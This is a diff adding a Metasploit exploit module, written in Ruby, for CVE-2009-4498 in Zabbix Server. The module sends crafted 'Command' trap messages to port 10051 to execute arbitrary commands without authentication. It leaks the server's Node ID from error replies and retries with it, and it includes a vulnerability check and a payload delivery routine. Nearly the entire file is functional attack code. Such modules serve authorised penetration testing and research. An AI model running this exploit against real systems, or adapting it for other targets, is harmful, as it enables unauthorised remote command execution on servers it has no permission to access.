@@ -1,0 +1,148 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::Tcp
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Zabbix Server Arbitrary Command Execution',
+			'Description'    => %q{
+					This module abuses the "Command" trap in Zabbix Server to execute arbitrary
+				commands without authentication. By default the Node ID "0" is used, if it doesn't
+				work, the Node ID is leaked from the error message and exploitation retried.
+
+				According to the vendor versions prior to 1.6.9 are vulnerable. The vulnerability
+				has been successfully tested on Zabbix Server 1.6.7 on Ubuntu 10.04.
+			},
+			'Author'         =>
+				[
+					'Nicob <nicob[at]nicob.net>', # Vulnerability discovery
+					'juan vazquez' # Metasploit module
+				],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					[ 'CVE', '2009-4498' ],
+					[ 'OSVDB', '60965' ],
+					[ 'BID', '37989' ],
+					[ 'EDB', '10432' ],
+					[ 'URL', 'https://support.zabbix.com/browse/ZBX-1030' ]
+				],
+			'Platform'       => ['unix'],
+			'Arch'           => ARCH_CMD,
+			'Privileged'     => false,
+			'Payload'        =>
+				{
+					'DisableNops' => true,
+					'Compat'      =>
+						{
+							'PayloadType' => 'cmd',
+							'RequiredCmd' => 'generic telnet',
+							# *_perl, *_python and *_ruby work if they are installed
+						}
+				},
+			'Targets'        =>
+				[
+					[ 'Zabbix 1.6.7', { } ]
+				],
+			'DefaultTarget' => 0,
+			'DisclosureDate'  => 'Sep 10 2009'
+		))
+
+		register_options(
+			[
+				Opt::RPORT(10051),
+			], self.class)
+	end
+
+	def send_command(sock, node_id, cmd)
+		host_id = Rex::Text.rand_text_numeric(3)
+		msg = "Command\255"
+		msg << "#{node_id}\255"
+		msg << "#{host_id}\255"
+		msg << "#{cmd}\n"
+		sock.put(msg)
+		res = sock.get_once
+		return res
+	end
+
+	def check
+		peer = "#{rhost}:#{rport}"
+		node_id = 0
+		clue = Rex::Text.rand_text_alpha(rand(5)+5)
+		cmd = "echo #{clue}"
+
+		connect
+		print_status("#{peer} - Sending 'Command' request...")
+		res = send_command(sock, node_id, cmd)
+		disconnect
+
+		if res
+			print_status(res)
+			if res =~ /#{clue}/
+				return Exploit::CheckCode::Vulnerable
+			elsif res =~ /-1/ and res=~ /NODE (\d*)/
+				node_id = $1
+				print_good("#{peer} - Node ID #{node_id} discovered")
+			else
+				return Exploit::CheckCode::Safe
+			end
+		else # No response
+			return Exploit::CheckCode::Safe
+		end
+
+		# Retry with the good node_id
+		connect
+		print_status("#{peer} - Sending 'Command' request with discovered Node ID...")
+		res = send_command(sock, node_id, cmd)
+		disconnect
+		if res and res =~ /#{clue}/
+			return Exploit::CheckCode::Vulnerable
+		end
+		return Exploit::CheckCode::Safe
+	end
+
+	def exploit
+		peer = "#{rhost}:#{rport}"
+		node_id = 0
+		cmd = payload.encoded
+
+		connect
+		print_status("#{peer} - Sending 'Command' request...")
+		res = send_command(sock, node_id, cmd)
+		disconnect
+
+		if res and res =~ /-1/ and res=~ /NODE (\d*)/
+			# Retry with the good node_id
+			node_id = $1
+			print_good("#{peer} - Node ID #{node_id} discovered")
+			connect
+			print_status("#{peer} - Sending 'Command' request with discovered Node ID...")
+			res = send_command(sock, node_id, cmd)
+			disconnect
+		end
+
+		# Read command output from socket if cmd/unix/generic payload was used
+		if (datastore['CMD'])
+			if res and res =~ /\x30\xad/
+				print_good("#{peer} - Command executed successfully")
+				print_status("Output:\n#{res.split("\x30\xad").last}")
+			else
+				print_error("#{peer} - Failed to execute the command")
+			end
+		end
+
+	end
+
+end
